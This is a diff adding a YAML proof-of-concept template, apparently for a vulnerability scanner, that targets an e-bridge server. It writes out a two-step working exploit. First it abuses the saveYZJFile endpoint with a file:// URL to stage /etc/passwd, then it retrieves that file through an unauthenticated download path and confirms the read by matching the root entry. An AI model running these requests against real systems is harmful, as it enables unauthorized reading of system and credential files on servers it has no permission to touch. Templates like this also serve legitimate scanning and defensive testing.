@@ -1,0 +1,21 @@
+name: poc-yaml-e-bridge-linux-readfile
+set:
+  testfile: /etc/passwd
+rules:
+  - method: GET
+    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{{testfile}}&fileExt=txt
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"id")
+    search: |
+      \"id\"\:\"(?P<var>.+?)\"\,
+  - method: GET
+    path: /file/fileNoLogin/{{var}}
+    follow_redirects: false
+    expression: |
+      response.status == 200 && r'root:[x*]:0:0:'.bmatches(body)
+detail:
+  author: mvhz81
+  info: e-bridge-readfile for Linux
+  links:
+    - https://mrxn.net/Infiltration/323.html
